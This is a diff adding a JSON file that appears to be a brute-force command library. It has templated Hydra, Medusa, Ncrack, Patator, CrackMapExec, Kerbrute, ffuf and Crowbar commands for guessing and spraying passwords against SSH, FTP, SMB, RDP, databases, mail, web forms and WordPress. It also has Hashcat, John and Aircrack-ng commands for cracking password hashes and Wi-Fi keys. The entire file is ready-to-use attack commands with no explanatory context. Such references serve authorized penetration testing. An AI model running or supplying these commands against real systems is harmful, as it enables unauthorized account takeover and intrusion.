@@ -1,0 +1,78 @@
+{
+  "爆破指令集": [
+    { "name": "Hydra 基础：SSH 用户/密码字典", "command": "hydra -L <userlist.txt> -P <passwords.txt> ssh://<host> -t 4 -V" },
+    { "name": "Hydra：FTP 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> ftp://<host> -V" },
+    { "name": "Hydra：Telnet 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> telnet://<host> -V" },
+    { "name": "Hydra：SMTP AUTH 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> -s 587 smtp://<host> -V" },
+    { "name": "Hydra：POP3 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> pop3://<host> -V" },
+    { "name": "Hydra：IMAP 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> imap://<host> -V" },
+    { "name": "Hydra：MySQL 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> mysql://<host> -V" },
+    { "name": "Hydra：PostgreSQL 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> postgres://<host> -V" },
+    { "name": "Hydra：MSSQL 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> mssql://<host> -V" },
+    { "name": "Hydra：SMB 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> smb://<host> -V" },
+    { "name": "Hydra：VNC 爆破", "command": "hydra -P <passwords.txt> vnc://<host> -V" },
+    { "name": "Hydra：RDP 爆破（如支持）", "command": "hydra -L <userlist.txt> -P <passwords.txt> rdp://<host> -V" },
+    { "name": "Hydra：HTTP Basic/Digest Auth", "command": "hydra -L <userlist.txt> -P <passwords.txt> http-get://<host> -m <path> -V" },
+    { "name": "Hydra：HTTP 表单 POST 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> <host> http-post-form \"<path>:<post_data>:<fail_regex>\" -V" },
+    { "name": "Hydra：HTTP 表单 GET 爆破", "command": "hydra -L <userlist.txt> -P <passwords.txt> <host> http-get-form \"<path>?<query>:<fail_regex>\" -V" },
+    { "name": "Hydra：代理与并发优化", "command": "hydra -L <userlist.txt> -P <passwords.txt> ssh://<host> -t 16 -w 5 -V" },
+    { "name": "Hydra：单一用户密码字典", "command": "hydra -l <user> -P <passwords.txt> ssh://<host> -V" },
+
+    { "name": "Medusa：SSH 爆破", "command": "medusa -h <host> -U <userlist.txt> -P <passwords.txt> -M ssh -f -v 4" },
+    { "name": "Medusa：FTP 爆破", "command": "medusa -h <host> -U <userlist.txt> -P <passwords.txt> -M ftp -f" },
+    { "name": "Medusa：SMB 爆破", "command": "medusa -h <host> -U <userlist.txt> -P <passwords.txt> -M smbnt -f" },
+    { "name": "Medusa：HTTP 表单爆破", "command": "medusa -h <host> -M http -U <userlist.txt> -P <passwords.txt> -m FORM:<path>:<post_data>:<fail_string>" },
+    { "name": "Medusa：并发与错误停止", "command": "medusa -h <host> -U <userlist.txt> -P <passwords.txt> -M ssh -t 16 -f" },
+
+    { "name": "Ncrack：RDP+SSH+FTP 组合爆破", "command": "ncrack -p rdp,ssh,ftp <host> -U <userlist.txt> -P <passwords.txt> -v" },
+    { "name": "Ncrack：RDP 爆破（安全间隔）", "command": "ncrack -p rdp <host> -U <userlist.txt> -P <passwords.txt> --connection-limit 5 -g t:20" },
+    { "name": "Ncrack：SMB 爆破", "command": "ncrack -p smb <host> -U <userlist.txt> -P <passwords.txt> -v" },
+    { "name": "Ncrack：HTTP 爆破", "command": "ncrack -p http <host> -U <userlist.txt> -P <passwords.txt> -v" },
+
+    { "name": "Patator：SSH 登录爆破", "command": "patator ssh_login host=<host> user=FILE0 password=FILE1 0=<userlist.txt> 1=<passwords.txt> -x ignore:mesg='Authentication failed' -t 8" },
+    { "name": "Patator：FTP 登录爆破", "command": "patator ftp_login host=<host> user=FILE0 password=FILE1 0=<userlist.txt> 1=<passwords.txt> -x ignore:code=530 -t 8" },
+    { "name": "Patator：HTTP 基础认证", "command": "patator http_fuzz url=http://<host>/<path> auth_type=basic auth=FILE0:FILE1 0=<userlist.txt> 1=<passwords.txt> -x ignore:code=401" },
+    { "name": "Patator：HTTP 表单登录", "command": "patator http_fuzz url=http://<host>/<path> method=POST body='user=FILE0&pass=FILE1' 0=<userlist.txt> 1=<passwords.txt> -x ignore:code=403" },
+    { "name": "Patator：SMTP/IMAP/POP3 登录", "command": "patator smtp_login host=<host> user=FILE0 password=FILE1 0=<userlist.txt> 1=<passwords.txt>; patator imap_login ...; patator pop_login ..." },
+    { "name": "Patator：MySQL/MSSQL/Postgres", "command": "patator mysql_login host=<host> user=FILE0 password=FILE1 0=<userlist.txt> 1=<passwords.txt>; patator mssql_login ...; patator postgres_login ..." },
+
+    { "name": "Hashcat：NTLM 字典破解", "command": "hashcat -m 1000 <hashes.txt> <wordlist.txt> --force --status --potfile-path <potfile>" },
+    { "name": "Hashcat：MD5 字典破解", "command": "hashcat -m 0 <hashes.txt> <wordlist.txt> -r /usr/share/hashcat/rules/best64.rule --status" },
+    { "name": "Hashcat：掩码攻击（密码策略）", "command": "hashcat -m 0 <hashes.txt> -a 3 ?u?l?l?l?l?d?d --status" },
+    { "name": "Hashcat：混合攻击（字典+掩码）", "command": "hashcat -m 1000 <hashes.txt> <wordlist.txt>?d?d --status" },
+    { "name": "Hashcat：WPA/WPA2 揭密", "command": "hashcat -m 22000 <wifi.hc22000> <wordlist.txt> --status" },
+    { "name": "Hashcat：显示已破解密码", "command": "hashcat -m 0 <hashes.txt> --show --potfile-path <potfile>" },
+
+    { "name": "John：自动格式猜测", "command": "john <hashes.txt> --wordlist=<wordlist.txt> --rules" },
+    { "name": "John：NT/LM/Zip/RAR 等格式", "command": "john --format=NT <hashes.txt> --wordlist=<wordlist.txt>; john --format=zip ...; john --format=rar ..." },
+    { "name": "John：增量/自定义字符集", "command": "john --incremental=ASCII <hashes.txt>" },
+    { "name": "John：显示已破解密码", "command": "john --show <hashes.txt>" },
+
+    { "name": "CME：SMB 密码喷洒", "command": "crackmapexec smb <host> -u <userlist.txt> -p <passwords.txt> --shares" },
+    { "name": "CME：本地账户认证", "command": "crackmapexec smb <host> -u <userlist.txt> -p <passwords.txt> --local-auth" },
+    { "name": "CME：单用户喷洒", "command": "crackmapexec smb <host> -u <user> -p <passwords.txt> --shares" },
+
+    { "name": "Kerbrute：用户枚举", "command": "kerbrute userenum -d <domain> <userlist.txt> --dc <dc_ip>" },
+    { "name": "Kerbrute：密码喷洒", "command": "kerbrute bruteuser -d <domain> <user> <passwords.txt> --dc <dc_ip>" },
+
+    { "name": "WFuzz：表单登录爆破（响应长度过滤）", "command": "wfuzz -u http://<host>/<path> -d \"user=FUZZ&pass=FUZ2Z\" -z file,<userlist.txt> -z file,<passwords.txt> --hh <len_unauth>" },
+    { "name": "FFUF：POST 登录爆破（关键字过滤）", "command": "ffuf -u http://<host>/<path> -X POST -d \"user=FUZZ&pass=FUZ2Z\" -w <userlist.txt>:FUZZ -w <passwords.txt>:FUZ2Z -fr \"Invalid|Failed\"" },
+    { "name": "FFUF：Basic 认证爆破", "command": "ffuf -u http://<host>/<path> -H \"Authorization: Basic FUZZ\" -w <base64_creds.txt>:FUZZ -fr \"401 Unauthorized\"" },
+
+    { "name": "Crowbar：RDP 密码喷洒", "command": "crowbar -b rdp -s <host>/32 -U <userlist.txt> -C <passwords.txt>" },
+    { "name": "Crowbar：SSH 密钥爆破", "command": "crowbar -b sshkey -s <host>/32 -u <user> -k <keys_dir>" },
+    { "name": "Crowbar：VNC 爆破", "command": "crowbar -b vnc -s <host>/32 -C <passwords.txt>" },
+
+    { "name": "SNMP 社区爆破：onesixtyone", "command": "onesixtyone -c <community_wordlist.txt> <host>" },
+
+    { "name": "CEWL：站点词典生成", "command": "cewl <url> -w <wordlist.txt> -d 2 -m 5" },
+    { "name": "Crunch：自定义规则生成字典", "command": "crunch 8 12 abcdef123 -o <wordlist.txt>" },
+    { "name": "RSMangler：组合扩展词典", "command": "rsmangler --file <base_words.txt> > <wordlist.txt>" },
+
+    { "name": "Aircrack-ng：WPA 揭密", "command": "aircrack-ng -w <wordlist.txt> -b <BSSID> <capture.cap>" },
+    { "name": "Aircrack-ng：WEP 破解（示例）", "command": "aircrack-ng -b <BSSID> <capture.cap>" },
+
+    { "name": "WPScan：WordPress 登录爆破", "command": "wpscan --url <url> --usernames <userlist.txt> --passwords <passwords.txt> --max-threads 10" },
+    { "name": "WPScan：XML-RPC 暴力测试", "command": "wpscan --url <url> --passwords <passwords.txt> --enumerate u --api-token <token>" }
+  ]
+}
